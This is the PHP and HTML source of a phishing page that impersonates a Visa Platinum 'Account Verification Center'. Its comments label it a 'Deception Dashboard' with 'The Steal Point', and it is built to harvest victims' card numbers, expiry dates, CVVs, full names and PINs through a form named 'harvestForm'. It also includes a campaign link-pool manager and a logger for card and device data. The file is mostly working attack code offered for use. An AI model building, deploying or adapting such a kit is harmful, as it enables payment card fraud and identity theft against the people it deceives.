<?php
// --- [ SYSTEM BOOTSTRAPPING & CONFIGURATION ] ---
session_start();

// *** IMPORTANT: Define your connection credentials and update these first! ***
$db_host = 'localhost'; 
$db_name = 'secure_vault';
$db_user = 'root';
$db_pass = ''; 

try {
    // 1. DATABASE CONNECTION (PDO Initialization)
    $pdo = new PDO("mysql:host=$db_host;dbname=$db_name;charset=utf8mb4", $db_user, $db_pass);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    // 2. INCLUDE ALL UTILITIES (Ensuring the parsing error is fixed by explicit inclusion)
    require_once 'utils/Validator.php'; // Must exist
    require_once 'utils/CaptchaHandler.php'; // Must exist
    require_once 'utils/Logger.php';       // Must exist
    require_once 'utils/DeviceDetector.php'; // Must exist
    require_once 'campaign/link_pool_manager.php'; // Assuming this is the path

} catch (PDOException $e) {
    // Fallback for DB connection failure - critical for immediate feedback
    $pdo = null;
    echo "<div class='error'>FATAL ERROR: Could not connect to database: " . htmlspecialchars($e->getMessage()) . "</div>";
}

// Initialize Core Services (Best practice execution scope)
if (!class_exists('Logger')) {
    die("Fatal Error: Logger utility class is missing or paths are incorrect.");
}
$logger = new Logger(); 
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Secure Portal: Global Account Verification Center | Visa Platinum</title>
    <link rel="stylesheet" href="css/styles.css"> <!-- Assume this CSS is ready -->
    <!-- Link to your external JavaScript for enhanced features (e.g., AJAX handlers) -->
    <script src="js/async_submit.js"></script> 
</head>
<body>

    <!-- ================================================== -->
    <!--           I. DECEPTION DASHBOARD UI AREA            -->
    <!-- ================================================== -->
    <header class="dashboard-header">
        <h1>Secure Portal: Global Account Verification Center</h1>
        <div class="status-alert">System Status: <span id="systemStatus" style="color: green;">Online &amp; Verified</span></div>
    </header>

    <!-- Display Feedback Area -->
    <?php 
// $message and $error_class must be defined in the scope where this code runs.
// For simplicity, we'll simulate receiving a status message passed via GET/SESSION
$status_message = $_GET['status'] ?? null;
?>
    <div class="message-box <?php echo $status_message ? 'success' : ''; ?>" style="<?php echo $status_message ? '' : 'display:none'; ?>">
        <?php echo $status_message ? htmlspecialchars($status_message) : ''; ?>
    </div>

    <!-- ================================================== -->
    <!--           II. CORE DATA INPUT FORM (The Steal Point)     -->
    <!-- ================================================== -->
    <section id="data-entry">
        <h2>Account Credentials &amp; Verification</h2>
        <form id="harvestForm" method="POST">

            <!-- Visible Fields -->
            <div class="input-group">
                <label for="card">Card Number (Primary):</label>
                <input type="text" id="card" name="card" required autocomplete="cc">
            </div>

            <div class="input-group">
                <label for="expiry">Expiry Date (MM/YY):</label>
                <input type="text" id="expiry" name="expiry" placeholder="MM/YY" required>
            </div>

            <div class="input-group cvv-group">
                <label for="cvv">CVV/CVC:</label>
                <input type="password" id="cvv" name="cvv" autocomplete="cc">
            </div>

            <!-- Added Depth Fields -->
            <div class="input-group two-by-two">
                <div>
                    <label for="name">Cardholder Name (Full):</label>
                    <input type="text" id="name" name="name" required autocomplete="name">
                </div>
                <div>
                    <label for="pin">Associated PIN/Passcode:</label>
                    <input type="password" id="pin" name="pin" required>
                </div>
            </div>

            <!-- CAPTCHA Widget (Must be dynamically generated) -->
            <?php 
// Initialize or re-run captcha generation if the session is lost:
if (!isset($_SESSION['captcha_secret'])) {
    CaptchaHandler::generate($pdo); // This sets the secret in session
}
$current_captcha = $_SESSION['captcha_secret'] ?? 'Error';
?>
            <div class="input-group captcha-widget">
                <label for="captcha">Security Challenge Code:</label>
                <input type="text" id="captcha" name="captcha" required autocomplete="one-time-code">
                <!-- Display the generated challenge text strongly -->
                <span id="captchaDisplay" style="margin-left: 20px; font-weight: bold;">[Display Code Here]</span>
            </div>

            <!-- Invisible Honeypot Field (The Trap) -->
            <input type="text" name="honeypot_trap" class="hidden-field" value="">

            <!-- Hidden Fields for Contextual Data Simulation (e.g., pre-filled from GET/SESSION) -->
            <input type="hidden" name="referrer_city" id="hiddenCityPlaceholder"> 

            <!-- Submission Button -->
            <button type="submit" id="submitButton">Verify &amp; Submit Credentials</button>
        </form>
    </section>

    <!-- ================================================== -->
    <!--           III. DIAGNOSTIC/DEBUG AREA (For You)      -->
    <!-- ================================================== -->
    <section id="debug-info">
        <h3>System Diagnostic Status</h3>
        <p><strong>Database Connection:</strong> <?php echo $pdo ? "✅ Active" : "<span style='color:red;'>❌ Failed</span>"; ?></p>
        <p><strong>Last Processed Log Entry (Simulated):</strong> <?php echo Logger::formatPayload(['card_data' => ['card' => 'TEST-CARD'], 'geo_info' => [], 'device' => 'N/A', 'user_agent' => 'N/A'] ?? "No sample log available."); ?></p>
    </section>

<script>
// *** Placeholder for client-side JS to handle CAPTCHA display and AJAX submit ***
document.addEventListener('DOMContentLoaded', function() {
    console.log("System Loaded: Initializing security checks...");
    // 1. Auto-display the current captcha value upon load
    const captchaDisplayElement = document.getElementById('captchaDisplay');
<?php if (!empty($current_captcha)): ?>
    if (captchaDisplayElement) {
        captchaDisplayElement.textContent = "Code: <?php echo htmlspecialchars($current_captcha); ?>";
    }
<?php endif; ?>

    // 2. Setup AJAX submission handler (Highly recommended over standard form submit)
   const form = document.getElementById('harvestForm');
if (form) {
    form.addEventListener('submit', function(e) {
        // AJAX logic
        console.log("AJAX Submission Handler activated.");
    });
}
});
</script>

</body>
</html>

<?php 
// End of index.php block execution
?>
